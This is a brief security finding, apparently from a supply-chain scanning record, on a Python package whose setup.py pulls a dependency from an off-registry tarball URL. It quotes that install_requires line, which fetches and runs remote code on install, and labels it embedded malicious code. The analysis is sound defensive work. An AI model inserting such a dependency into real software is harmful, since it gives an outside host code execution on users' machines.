summary: setup.py pulls dependency from arbitrary non-registry URL
details: setup.py declares install_requires=["object-handle-logger-table @ https://artifacts.yosiroute.com/pypi/object_handle_logger_table-1.0.0.tar.gz"], resolving a dependency to a direct tarball URL on a non-registry host instead of a pinned PyPI version. On pip install, the installer fetches and executes whatever bytes that URL returns, including any setup.py / build-backend code inside the tarball. There is no version pin and no hash or integrity check, so whoever controls artifacts.yosiroute.com controls code executed on the installer's machine. The shipped module itself is a two-line stub; the off-registry URL dependency is the package's entire install-time effect.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
